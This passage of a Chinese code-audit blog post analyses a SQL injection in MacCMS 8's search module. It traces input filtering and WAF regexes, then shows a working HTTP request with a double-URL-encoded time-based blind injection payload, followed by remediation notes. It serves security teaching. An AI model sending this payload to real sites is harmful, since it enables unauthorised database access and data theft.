class="string">&#x27;search&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tpl</span>-&gt;C[<span class="string">&quot;siteaid&quot;</span>] = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">be</span>(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;wd&quot;</span>)); <span class="variable">$wd</span> = <span class="title function_ invoke__">chkSql</span>(<span class="variable">$wd</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$wd</span>))&#123; <span class="variable">$tpl</span>-&gt;P[<span class="string">&quot;wd&quot;</span>] = <span class="variable">$wd</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进一下 <strong>be()</strong> 函数，其位置在 <strong>inc\common\function.php</strong> 文件中，关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">be</span>(<span class="params"><span class="variable">$mode</span>,<span class="variable">$key</span>,<span class="variable">$sp</span>=<span class="string">&#x27;,&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;magic_quotes_runtime&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$magicq</span>= <span class="title function_ invoke__">get_magic_quotes_gpc</span>();</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$mode</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>?<span class="variable">$_POST</span>[<span class="variable">$key</span>] :<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>?<span class="variable">$_GET</span>[<span class="variable">$key</span>] :<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;arr&#x27;</span>:</span><br><span class="line">            <span class="variable">$arr</span> =<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$_POST</span>[<span class="variable">$key</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$arr</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$value</span>=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="variable">$res</span>=<span class="title function_ invoke__">implode</span>(<span class="variable">$sp</span>,<span class="variable">$arr</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>? <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] : <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分代码的作用就是对 <strong>GET，POST，REQUEST</strong> 接收到的参数进行 <strong>addslashes</strong> 的转义处理。根据前面针对 <strong>be(“all”, “wd”)</strong> 的分析，我们知道 <strong>wd</strong> 参数的值是通过 <strong>REQUEST</strong> 方式接收，并使用 <strong>addslashes</strong> 函数进行转义处理。再回到 <strong>inc\module\vod.php</strong> 文件中的，我们跟进一下 <strong>chkSql()</strong> 函数，该函数位置在 <strong>inc\common\360_safe3.php</strong> 文件中，具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkSql</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$getfilter</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span>=<span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span>==<span class="variable">$d</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$d</span> = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">StopAttack</span>(<span class="number">1</span>,<span class="variable">$s</span>,<span class="variable">$getfilter</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlEncode</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下这部分代码的作用，其实就是在 <strong>第8行-第12行</strong> 针对接收到的的变量进行循环的 <strong>urldecode</strong> （也就是url解码）动作，然后在 <strong>第15行</strong> ，使用 <strong>StopAttack</strong> 函数解码后的数据进行处理，最后将处理后的数据通过 <strong>htmlEncode</strong> 方法进行最后的处理，然后返回处理之后的值。</p><p>我们先跟进一下 <strong>StopAttack</strong> 函数，该函数位置在 <strong>inc\common\360_safe3.php</strong> 文件中，我们截取部分相关代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span>(<span class="params"><span class="variable">$StrFiltKey</span>,<span class="variable">$StrFiltValue</span>,<span class="variable">$ArrFiltReq</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$errmsg</span> = <span class="string">&quot;&lt;div style=\&quot;position:fixed;top:0px;width:100%;height:100%;background-color:white;color:green;font-weight:bold;border-bottom:5px solid #999;\&quot;&gt;&lt;br&gt;您的提交带有不合法参数，谢谢合作!&lt;br&gt;操作IP: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>].<span class="string">&quot;&lt;br&gt;操作时间: &quot;</span>.<span class="title function_ invoke__">strftime</span>(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).<span class="string">&quot;&lt;br&gt;操作页面:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot;&lt;br&gt;提交方式: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>].<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$StrFiltValue</span>=<span class="title function_ invoke__">arr_foreach</span>(<span class="variable">$StrFiltValue</span>);</span><br><span class="line">    <span class="variable">$StrFiltValue</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$StrFiltValue</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrFiltValue</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$errmsg</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrFiltKey</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$errmsg</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到代码的 <strong>第13行-第19行</strong> 调用正则进行处理，而相关的正则表达式是 <strong>$ArrFiltReq</strong> 变量。这里 <strong>第13行</strong> 的 <strong>$ArrFiltReq</strong> 变量就是前面传入的 <strong>$getfilter</strong> ，即语句变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$getfilter</span>.<span class="string">&quot;/is&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>我们跟进一下 <strong>$getfilter</strong> 变量。该变量在 <strong>inc\common\360_safe3.php</strong> 文件中，我们截取部分相关代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get拦截规则</span></span><br><span class="line"><span class="variable">$getfilter</span> = <span class="string">&quot;\\&lt;.+javascript:window\\[\\].*\\&gt;|&lt;.*(&amp;#\\d+;)+?&gt;|&lt;.*(data|src)=data:text\\/html.*?&gt;|\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*?|sleep.*?|group_concat\\).*?\\b(load_file|benchmark|[a-z]&#123;4,&#125;)\\b|\\bon\\w+=[^&gt;]+\\&gt;|SELECT\\s+(.*.)+\\b\\@&#123;1,2&#125;\\s+.*|SET\\s+.*\\b;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//post拦截规则</span></span><br><span class="line"><span class="variable">$postfilter</span> = <span class="string">&quot;&lt;.*=&amp;(#\\d+;)?&gt;.*(alert\\|confirm\\|expression\\|prompt\\|benchmark.*?|sleep.*?|group_concat\\).*?\\b(load_file|benchmark)\\b|\\bon\\w+=[^&gt;]+\\&gt;|\\bEXEC\\b|UNION\\s+SELECT.*|INSERT\\s+INTO.*VALUES\\s*(\\(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cookie拦截规则</span></span><br><span class="line"><span class="variable">$cookiefilter</span> = <span class="string">&quot;benchmark.*?|\\b(load_file|exec|SELECT|INSERT|DELETE|CREATE|ALTER|DROP|TRUNCATE|\\@\\@)\\b.*?VALUES\\(.*|SET\\s+.*&quot;</span>;</span><br></pre></td></tr></table></figure><p>这串代码的功能显而易见，就是检测 <strong>GET，POST，COOKIE</strong> 中的恶意数据。刚刚在 <strong>chkSql()</strong> 函数最后有串代码是： <strong>return htmlEncode($s);</strong> ，我们跟进一下 <strong>htmlEncode</strong> 函数。该函数位置在 <strong>inc\common\function.php</strong> 文件中，相关代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEncode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">isN</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">38</span>), <span class="string">&quot;&amp;#38;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">39</span>), <span class="string">&quot;&amp;#39;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">32</span>), <span class="string">&quot;&amp;nbsp;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">34</span>), <span class="string">&quot;&amp;quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">9</span>), <span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">13</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的功能是针对 <strong>&amp;</strong> 、 <strong>‘</strong> 、 <strong>空格</strong> 、 <strong>“</strong> 、 <strong>TAB</strong> 、 <strong>回车</strong> 、 <strong>换行</strong> 、 <strong>大于小于号</strong> 等符号进行实体编码转换。但是这里百密一疏，没有针对其他的空白字符和反斜杠进行处理。这里先埋下一个伏笔，我们继续往下看。</p><p>首先注入点是在 <strong>inc\common\template.php</strong> ，相关代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们继续看看这个 <strong>$lp[‘wd’]</strong> 的值是怎么获取的，在 <strong>inc\common\template.php</strong> 文件中找到其相关代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;vod&#x27;</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;order&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;order&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;order&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;by&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;by&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;by&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;pagesize&#x27;</span>]))&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;wd&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;wd&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>上图 <strong>第13行</strong> ，当 <strong>P[‘wd’]</strong> 不为空的时候， <strong>$lp[‘wd’]</strong> 是从 <strong>P[“wd”]</strong> 中获取到数据的。根据前面我们的分析，在 <strong>inc\module\vod.php</strong> 文件中的存在这样一行代码： <strong>$tpl-&gt;P[“wd”] &#x3D; $wd;</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$method</span>==<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tpl</span>-&gt;C[<span class="string">&quot;siteaid&quot;</span>] = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">be</span>(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;wd&quot;</span>)); </span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">chkSql</span>(<span class="variable">$wd</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$wd</span>)) &#123;</span><br><span class="line">        <span class="variable">$tpl</span>-&gt;P[<span class="string">&quot;wd&quot;</span>] = <span class="variable">$wd</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 <strong>wd</strong> 是可以从 <strong>REQUEST</strong> 中获取到，所以这里的 <strong>wd</strong> 实际上是可控的。</p><h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>现在我们需要针对漏洞进行验证工作，这就涉及到POC的构造。在前面分析中，我们知道 <strong>htmlEncode</strong> 针对 <strong>&amp;</strong> 、 <strong>‘</strong> 、 <strong>空格</strong> 、 <strong>“</strong> 、 <strong>TAB</strong> 、 <strong>回车</strong> 、 <strong>换行</strong> 、 <strong>大于小于号</strong> 进行实体编码转换。但是这里的注入类型是字符型注入，需要引入单引号来进行闭合，但是 <strong>htmlEncode</strong> 函数又对单引号进行了处理。因此我们可以换个思路。</p><p>我们看到注入攻击的时候，我们的 <strong>$lp[‘wd’]</strong> 参数可以控制SQL语句中的两个位置，因此这里我们可以通过引入 <strong>反斜杠</strong> 进行单引号的闭合，但是针对前面的分析我们知道其调用了 <strong>addslashes</strong> 函数进行转义处理，而 <strong>addslashes</strong> 会对 <strong>反斜杠</strong> 进行处理，但是这里对用户请求的参数又会先进行 <strong>url解码</strong> 的操作，因此这里可以使用 <strong>双url编码</strong> 绕过 <strong>addslashes</strong> 函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span> . <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] . <span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span> . <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] . <span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/maccms8/index.php?m=vod-search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>98</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-mel">wd=))||<span class="keyword">if</span>((<span class="keyword">select</span>%0b(<span class="keyword">select</span>(m_name)<span class="string">``</span>from(mac_manager))regexp(<span class="number">0x5e61</span>)),(<span class="string">`sleep`</span>(<span class="number">3</span>)),<span class="number">0</span>)#%25%35%63</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-17.png"></p><p>payload传到程序里，经过拼接后的数据库语句如下所示：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-18.png"></p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><strong>核心问题点</strong></p><ol><li><p><strong>用户输入未经充分验证与过滤</strong>：</p><ul><li>问题的核心在于用户输入（通过<code>$lp[&#39;wd&#39;]</code>）被直接用于SQL查询构建，而没有进行严格的检查和限制。</li><li>尽管输入经过了<code>chkSql()</code>的初步处理，包括URL解码和<code>StopAttack()</code>的安全过滤，但这些措施未能完全避免SQL注入的风险。</li></ul></li><li><p><strong>使用<code>addslashes()</code>的不足</strong>：</p><ul><li><code>be()</code>函数使用<code>addslashes()</code>来转义输入数据。但<code>addslashes()</code>对于单字节字符集环境可能足够，对于多字节字符集如UTF-8，这种转义方法可能被绕过。</li><li>在某些特定情况下，双重URL编码可以绕过<code>addslashes()</code>的转义，导致注入攻击的可能。</li></ul></li><li><p><strong>不恰当的SQL查询构建方式</strong>：</p><ul><li>SQL查询通过字符串拼接构建，其中直接插入了用户控制的变量<code>$lp[&#39;wd&#39;]</code>。这种方式在没有严格的输入验证和适当的转义机制的情况下，极易导致SQL注入。</li></ul></li><li><p><strong>安全函数<code>htmlEncode()</code>的不足</strong>：</p><ul><li>该函数主要对HTML特殊字符进行编码，但在阻止SQL注入方面作用有限。</li><li>SQL注入需要针对SQL语法特征进行专门的处理，而非仅仅是HTML编码。</li></ul></li></ol><p>这里的防御手段其实已经很多了，但就是因为这么多防御手段结合在一起出现了有趣的绕过方式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEncode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isN</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">38</span>), <span class="string">&quot;&amp;#38;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">39</span>), <span class="string">&quot;&amp;#39;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">32</span>), <span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">34</span>), <span class="string">&quot;&amp;quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">9</span>), <span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">13</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">92</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);      <span 